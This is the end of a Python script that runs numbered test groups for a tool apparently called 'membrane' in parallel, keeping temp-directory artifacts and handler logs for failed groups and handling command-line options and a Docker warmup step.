        directory = Path(tempfile.mkdtemp(prefix=f"membrane-test-{number:02}-", dir=artifacts))
        ctx = Context(number, membrane_cmd, directory, environment.copy(), output)
        GROUPS[number].run(ctx)
        passed = True
    except TestFailure as error:
        output.append("FAIL " + str(error))
    except Exception:
        output.append("FAIL " + traceback.format_exc())
    if directory is not None:
        try:
            if keep_artifacts or not passed:
                # Copy handler logs alongside the exact command output and inputs.
                for idfile in directory.rglob("session-id*"):
                    session_id = idfile.read_text().strip()
                    if not session_id:
                        continue
                    log = Path.home() / ".membrane/logs" / f"membrane-handler-{session_id}.log"
                    if not log.exists():
                        log = log.with_suffix(".log.gz")
                    if log.exists():
                        shutil.copy2(log, directory / log.name)
                        output.append(f"Handler log: {directory / log.name}")
                output.append(f"Artifacts retained: {directory}")
                (directory / "result.log").write_text("\n".join(output) + "\n")
            else:
                shutil.rmtree(directory)
        except Exception as error:
            passed = False
            output.append(f"FAIL artifact cleanup/reporting: {error}\nArtifacts retained: {directory}")
    return passed, "\n".join(output) + "\n"


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("-g", "--group", action="append", metavar="GROUPS",
                        help="group numbers, comma-separated or repeated (default: all)")
    parser.add_argument("-l", "--list", action="store_true", help="list groups and exit")
    parser.add_argument("-j", "--jobs", type=int, metavar="N", help="concurrent groups (default: CPU count)")
    parser.add_argument("--keep-artifacts", action="store_true", help="retain successful group artifacts too")
    parser.add_argument("--no-warmup", action="store_true", help="skip the one-time image and binary warmup")
    args = parser.parse_args()
    if args.jobs is not None and args.jobs < 1:
        parser.error("--jobs must be at least 1")
    selected = set(GROUPS)
    if args.group is not None:
        try:
            selected = {int(value) for flag in args.group for value in flag.split(",")}
        except ValueError:
            parser.error("--group requires comma-separated group numbers")
        unknown = selected - GROUPS.keys()
        if unknown:
            parser.error("unknown group(s): " + ", ".join(map(str, sorted(unknown))))
    if args.list:
        for number, group in GROUPS.items():
            print(f"{number:<3} {group.description}")
        return 0

    environment = dict(os.environ)
    if sys.platform == "darwin":
        environment.setdefault("DOCKER_CONTEXT", "colima-membrane")
    membrane_cmd = environment.get("MEMBRANE_CMD", str(REPO_ROOT / "membrane"))
    # Resolve explicit relative paths before workers change their subprocess cwd.
    if os.sep in membrane_cmd:
        membrane_cmd = str(Path(membrane_cmd).expanduser().resolve())
    if not args.no_warmup:
        print("=== Warmup ===", flush=True)
        try:
            result = run(None, [str(REPO_ROOT / "scripts/run-dev.sh"), "--no-update", "--no-trace",
                                "--no-global-config", "--", "echo", "ok"],
                         cwd=REPO_ROOT, env=environment, timeout=1800)
        except TestFailure as error:
            print(f"FAIL {error}")
            return 1
        print(result.stdout + result.stderr, end="", flush=True)

    # Home is shared by Colima, whereas macOS /private/tmp need not be.
    artifacts = Path.home() / ".membrane/tmp"
    artifacts.mkdir(parents=True, exist_ok=True)
    jobs = args.jobs if args.jobs is not None else min(len(selected), os.cpu_count() or 4)
    failed = []
    with ThreadPoolExecutor(max_workers=jobs) as executor:
        futures = {executor.submit(run_group, number, membrane_cmd, environment, artifacts,
                                   args.keep_artifacts): number for number in sorted(selected)}
        for future in as_completed(futures):
            passed, output = future.result()
            print(output, flush=True)
            if not passed:
                failed.append(futures[future])
    print(f"{len(selected) - len(failed)} passed, {len(failed)} failed")
    for number in sorted(failed):
        print(f"Failed {number:02}: {GROUPS[number].description}")
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())
